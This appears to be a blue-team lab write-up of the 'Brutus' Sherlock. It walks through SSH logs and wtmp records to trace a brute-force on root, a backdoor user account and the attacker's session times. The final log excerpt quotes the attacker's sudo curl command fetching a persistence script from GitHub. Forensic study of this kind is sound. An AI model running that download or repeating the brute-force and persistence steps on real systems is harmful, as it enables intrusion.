---
layout: page
title: Brutus
description: Analyzed logs and identified brute-force.
img: 
importance: 5
category: Sherlocks
team: Blue Team Labs
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/brutus/logo.png" title="HTB Brutus" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<h2>Link</h2>
<a href="https://app.hackthebox.com/sherlocks/Brutus">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
"Et tu, Brute!"  We are going to tackle the Brutus Sherlock. 

The first thing we will look for is the IP address of the attacker.

{% capture ipidentify %}
<snip>

Mar  6 06:31:01 ip-172-31-35-28 CRON[2313]: pam_unix(cron:session): session closed for user confluence
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Invalid user admin from 65.2.161.68 port 46380
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Received disconnect from 65.2.161.68 port 46380:11: Bye Bye [preauth]
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Disconnected from invalid user admin 65.2.161.68 port 46380 [preauth]
Mar  6 06:31:31 ip-172-31-35-28 sshd[620]: error: beginning MaxStartups throttling
Mar  6 06:31:31 ip-172-31-35-28 sshd[620]: drop connection #10 from [65.2.161.68]:46482 on [172.31.35.28]:22 past MaxStartups
Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: Invalid user admin from 65.2.161.68 port 46392
Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: pam_unix(sshd:auth): check pass; user unknown
Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
Mar  6 06:31:31 ip-172-31-35-28 sshd[2332]: Invalid user admin from 65.2.161.68 port 46444
Mar  6 06:31:31 ip-172-31-35-28 sshd[2331]: Invalid user admin from 65.2.161.68 port 46436

<snip>
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=ipidentify %}

<br />
Identify the successful login of the root when the brute-force was successful.

{% capture success %}
<snip>

Mar  6 06:31:39 ip-172-31-35-28 sshd[2399]: Failed password for root from 65.2.161.68 port 46852 ssh2
Mar  6 06:31:39 ip-172-31-35-28 sshd[2407]: Failed password for root from 65.2.161.68 port 46876 ssh2
Mar  6 06:31:39 ip-172-31-35-28 sshd[2383]: Received disconnect from 65.2.161.68 port 46722:11: Bye Bye [preauth]
Mar  6 06:31:39 ip-172-31-35-28 sshd[2383]: Disconnected from invalid user svc_account 65.2.161.68 port 46722 [preauth]
Mar  6 06:31:39 ip-172-31-35-28 sshd[2384]: Received disconnect from 65.2.161.68 port 46732:11: Bye Bye [preauth]
Mar  6 06:31:39 ip-172-31-35-28 sshd[2384]: Disconnected from invalid user svc_account 65.2.161.68 port 46732 [preauth]
Mar  6 06:31:39 ip-172-31-35-28 sshd[2409]: Failed password for root from 65.2.161.68 port 46890 ssh2
Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2
Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: New session 34 of user root.

<snip>
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=success %}

<br />
Time to move on to analyze the wtmp log.  Run the included the python script to analyze wtmp.

{% capture analyzewtmp %}
┌──(kali㉿kali)-[~/Desktop/brutus]
└─$ python3 utmp.py -o outfile wtmp
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=analyzewtmp %}

<br />
Review the full results of the output.

{% capture fullresults %}
"type"  "pid"   "line"  "id"    "user"  "host"  "term"  "exit"  "session"       "sec"   "usec"  "addr"
"BOOT_TIME"     "0"     "~"     "~~"    "reboot"        "6.2.0-1017-aws"        "0"     "0"     "0"     "2024/01/25 22:12:17"   "804944"        "0.0.0.0"
"INIT"  "601"   "ttyS0" "tyS0"  ""      ""      "0"     "0"     "601"   "2024/01/25 22:12:31"   "72401" "0.0.0.0"
"LOGIN" "601"   "ttyS0" "tyS0"  "LOGIN" ""      "0"     "0"     "601"   "2024/01/25 22:12:31"   "72401" "0.0.0.0"
"INIT"  "618"   "tty1"  "tty1"  ""      ""      "0"     "0"     "618"   "2024/01/25 22:12:31"   "80342" "0.0.0.0"
"LOGIN" "618"   "tty1"  "tty1"  "LOGIN" ""      "0"     "0"     "618"   "2024/01/25 22:12:31"   "80342" "0.0.0.0"
"RUN_LVL"       "53"    "~"     "~~"    "runlevel"      "6.2.0-1017-aws"        "0"     "0"     "0"     "2024/01/25 22:12:33"   "792454"        "0.0.0.0"
"USER"  "1284"  "pts/0" "ts/0"  "ubuntu"        "203.101.190.9" "0"     "0"     "0"     "2024/01/25 22:13:58"   "354674"        "203.101.190.9"
"DEAD"  "1284"  "pts/0" ""      ""      ""      "0"     "0"     "0"     "2024/01/25 22:15:12"   "956114"        "0.0.0.0"
"USER"  "1483"  "pts/0" "ts/0"  "root"  "203.101.190.9" "0"     "0"     "0"     "2024/01/25 22:15:40"   "806926"        "203.101.190.9"
"DEAD"  "1404"  "pts/0" ""      ""      ""      "0"     "0"     "0"     "2024/01/25 23:34:34"   "949753"        "0.0.0.0"
"USER"  "836798"        "pts/0" "ts/0"  "root"  "203.101.190.9" "0"     "0"     "0"     "2024/02/11 21:33:49"   "408334"        "203.101.190.9"
"INIT"  "838568"        "ttyS0" "tyS0"  ""      ""      "0"     "0"     "838568"        "2024/02/11 21:39:02"   "172417"        "0.0.0.0"
"LOGIN" "838568"        "ttyS0" "tyS0"  "LOGIN" ""      "0"     "0"     "838568"        "2024/02/11 21:39:02"   "172417"        "0.0.0.0"
"USER"  "838962"        "pts/1" "ts/1"  "root"  "203.101.190.9" "0"     "0"     "0"     "2024/02/11 21:41:11"   "700107"        "203.101.190.9"
"DEAD"  "838896"        "pts/1" ""      ""      ""      "0"     "0"     "0"     "2024/02/11 21:41:46"   "272984"        "0.0.0.0"
"USER"  "842171"        "pts/1" "ts/1"  "root"  "203.101.190.9" "0"     "0"     "0"     "2024/02/11 21:54:27"   "775434"        "203.101.190.9"
"DEAD"  "842073"        "pts/1" ""      ""      ""      "0"     "0"     "0"     "2024/02/11 22:08:04"   "769514"        "0.0.0.0"
"DEAD"  "836694"        "pts/0" ""      ""      ""      "0"     "0"     "0"     "2024/02/11 22:08:04"   "769963"        "0.0.0.0"
"RUN_LVL"       "0"     "~"     "~~"    "shutdown"      "6.2.0-1017-aws"        "0"     "0"     "0"     "2024/02/11 22:09:18"   "731"   "0.0.0.0"
"BOOT_TIME"     "0"     "~"     "~~"    "reboot"        "6.2.0-1018-aws"        "0"     "0"     "0"     "2024/03/06 17:17:15"   "744575"        "0.0.0.0"
"INIT"  "464"   "ttyS0" "tyS0"  ""      ""      "0"     "0"     "464"   "2024/03/06 17:17:27"   "354378"        "0.0.0.0"
"LOGIN" "464"   "ttyS0" "tyS0"  "LOGIN" ""      "0"     "0"     "464"   "2024/03/06 17:17:27"   "354378"        "0.0.0.0"
"INIT"  "505"   "tty1"  "tty1"  ""      ""      "0"     "0"     "505"   "2024/03/06 17:17:27"   "469940"        "0.0.0.0"
"LOGIN" "505"   "tty1"  "tty1"  "LOGIN" ""      "0"     "0"     "505"   "2024/03/06 17:17:27"   "469940"        "0.0.0.0"
"RUN_LVL"       "53"    "~"     "~~"    "runlevel"      "6.2.0-1018-aws"        "0"     "0"     "0"     "2024/03/06 17:17:29"   "538024"        "0.0.0.0"
"USER"  "1583"  "pts/0" "ts/0"  "root"  "203.101.190.9" "0"     "0"     "0"     "2024/03/06 17:19:55"   "151913"        "203.101.190.9"
"USER"  "2549"  "pts/1" "ts/1"  "root"  "65.2.161.68"   "0"     "0"     "0"     "2024/03/06 17:32:45"   "387923"        "65.2.161.68"
"DEAD"  "2491"  "pts/1" ""      ""      ""      "0"     "0"     "0"     "2024/03/06 17:37:24"   "590579"        "0.0.0.0"
"USER"  "2667"  "pts/1" "ts/1"  "cyberjunkie"   "65.2.161.68"   "0"     "0"     "0"     "2024/03/06 17:37:35"   "475575"        "65.2.161.68
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=fullresults %}

<br />
Find the root "USER" with the IP address and get the time.  Convert it to the UTC since the file is in local time.

{% capture gettime %}
<snip>

"USER"  "1583"  "pts/0" "ts/0"  "root"  "203.101.190.9" "0"     "0"     "0"     "2024/03/06 17:19:55"   "151913"        "203.101.190.9"
"USER"  "2549"  "pts/1" "ts/1"  "root"  "65.2.161.68"   "0"     "0"     "0"     "2024/03/06 17:32:45"   "387923"        "65.2.161.68"
"DEAD"  "2491"  "pts/1" ""      ""      ""      "0"     "0"     "0"     "2024/03/06 17:37:24"   "590579"        "0.0.0.0"

<snip>
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=gettime %}

<br />
Going back to the log we can nick the session number.

{% capture nicksession %}
<snip>

Mar  6 06:32:39 ip-172-31-35-28 sshd[620]: exited MaxStartups throttling after 00:01:08, 21 connections dropped
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
Mar  6 06:33:01 ip-172-31-35-28 CRON[2561]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
Mar  6 06:33:01 ip-172-31-35-28 CRON[2562]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
Mar  6 06:33:01 ip-172-31-35-28 CRON[2561]: pam_unix(cron:session): session closed for user confluence
Mar  6 06:33:01 ip-172-31-35-28 CRON[2562]: pam_unix(cron:session): session closed for user confluence

<snip>
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=nicksession %}

<br />
We also have to track down any new users that the attacker may have added through the course of the attack.

{% capture idnewuser %}
<snip>

Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/gshadow: name=cyberjunkie
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: new group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
Mar  6 06:34:26 ip-172-31-35-28 passwd[2603]: pam_unix(passwd:chauthtok): password changed for cyberjunkie
Mar  6 06:34:31 ip-172-31-35-28 chfn[2605]: changed user 'cyberjunkie' information

<snip>
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=idnewuser %}

<br />
Next up, we can identify the Technique of adding a local user as a persistence technique in the MITRE framework.

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/brutus/mitre.png" title="MITRE Framework" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://attack.mitre.org/techniques/T1136/001/">https://attack.mitre.org/techniques/T1136/001/</a>

<br />
Now, we have to find what time the attacker disconnected from user root.

{% capture logoffroot %}
<snip>

Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Received disconnect from 65.2.161.68 port 53184:11: disconnected by user
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session closed for user root
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Session 37 logged out. Waiting for processes to exit.
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Removed session 37.

<snip>
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=logoffroot %}

<br />
Our final task is to find the curl command that download the (potentially) malicious script.

{% capture findcurl %}
<snip>

Mar  6 06:39:01 ip-172-31-35-28 CRON[2765]: pam_unix(cron:session): session closed for user confluence
Mar  6 06:39:01 ip-172-31-35-28 CRON[2764]: pam_unix(cron:session): session closed for user confluence
Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
Mar  6 06:39:38 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)
Mar  6 06:39:39 ip-172-31-35-28 sudo: pam_unix(sudo:session): session closed for user root
Mar  6 06:40:01 ip-172-31-35-28 CRON[2783]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)

<snip>
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=findcurl %}

<br />
And with that, we tackle the Brutus box.  Time to take on the next one!